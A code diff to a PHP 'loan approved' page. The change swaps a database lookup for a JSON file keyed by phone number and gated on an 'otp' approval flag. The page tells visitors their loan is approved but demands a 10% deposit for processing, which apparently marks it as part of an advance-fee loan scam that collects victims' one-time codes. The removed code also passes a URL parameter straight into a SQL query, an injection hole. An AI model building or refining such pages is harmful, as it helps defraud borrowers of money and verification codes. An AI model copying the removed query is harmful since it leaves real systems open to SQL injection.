@@ -1,19 +1,30 @@
 <?php
-$conn = new mysqli("localhost","root","","loan-db");
+$phone = $_GET['phone'] ?? '';
 
-$id = $_GET['id'];
+if (!$phone) {
+    echo "Invalid access";
+    exit();
+}
 
-$result = $conn->query("SELECT * FROM user_details WHERE id=$id");
-$row = $result->fetch_assoc();
+// Load statuses from JSON
+$file = __DIR__ . "/status.json";
+$statuses = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
 
-$amount = $row['amount'];
+// Check if approved
+$status = $statuses[$phone]['otp'] ?? '';
+if ($status !== 'approve') {
+    echo "You are not authorized to view this page";
+    exit();
+}
+
+// Optional: Approved amount (can be hardcoded or added to JSON)
+$amount = $statuses[$phone]['amount'] ?? '1000'; // example amount
 ?>
 
 <!DOCTYPE html>
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <style>
 body {
     margin: 0;
@@ -58,17 +69,12 @@ body {
     font-size: 13px;
 }
 </style>
-
 </head>
 
 <body>
-
 <div class="container">
-
     <div class="success-icon">✓</div>
-
     <h2>🎉 Congratulations!</h2>
-
     <p>Your loan has been <b>approved!</b><br>
     Funds will be sent shortly.</p>
 
@@ -80,8 +86,6 @@ body {
     <div class="notice">
         ⚠ You must maintain 10% deposit for processing.
     </div>
-
 </div>
-
 </body>
 </html>
